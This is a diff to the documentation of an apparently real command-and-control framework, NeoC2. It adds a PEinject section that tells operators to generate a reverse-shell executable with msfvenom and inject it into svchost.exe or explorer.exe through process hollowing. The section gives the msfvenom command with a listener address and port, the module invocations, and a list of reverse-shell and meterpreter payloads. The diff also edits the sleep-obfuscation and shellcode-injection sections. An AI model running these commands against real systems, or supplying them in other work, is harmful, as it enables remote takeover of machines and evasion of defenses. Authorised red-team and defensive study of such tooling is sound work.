@@ -12,7 +12,7 @@
 - [Evasion Techniques](#evasion-techniques)
 - [File Operations](#file-operations)
 - [Task Chaining](#task-chaining-web-ui-only)
-- [Process Injection](#process-injection)
+- [Process Injections](#process-injections)
 - [Event Monitoring](#event-monitoring)
 - [Security Features](#security-features)
 - [Troubleshooting](#troubleshooting)
@@ -321,8 +321,6 @@ run <module_name> [options]   # Execute a module
 
 ```
 # Load and run sleep obfuscation module
-modules load sleep_obfuscation
-run sleep_obfuscation agent_id=<id> technique=jitter
 
 # Load and run persistence module
 modules load persistence
@@ -461,10 +459,11 @@ NeoC2 provides advanced task chaining capabilities, allowing operators to create
    - Service installation
    - File system persistence
 
-
-## Process Injection
+## Process Injections
 
 ### PInject
+
+In-memory shellcode injection into target processes with the Go-based Agent 
 
 #### Usage
 1. Generate compatible shellcode using msfvenom
@@ -501,6 +500,32 @@ run pinject <shellcode> [agent_id=<agent_id>] # METHOD - 2
 - windows/x64/shell_reverse_tcp
 - windows/x64/exec
 - Any custom raw shellcode
+
+
+### PEinject
+
+Inject a PE file into a target processes 
+
+
+#### Usage
+1. Generate compatible PE payload using msfvenom
+2. Parse the `pe_file` path on the C2 server as a required argument of the peinject module
+3. The agent will in-memory inject this into either svchost.exe or explorer.exe using Process Hollowing
+
+#### msfvenom Command Syntax
+
+```
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe
+
+peinject <pe_file> [agent_id=<agent_id>] [pe_file=<payload_path>] # METHOD - 1
+run peinject <pe_file> [agent_id=<agent_id>] [pe_file=<payload_path>] # METHOD - 2
+```
+
+#### Supported Payloads
+- windows/x64/exec
+- windows/x64/shell_reverse_tcp
+- windows/x64/meterpreter/reverse_tcp
+- windows/x64/exec
 
 
 ## Event Monitoring
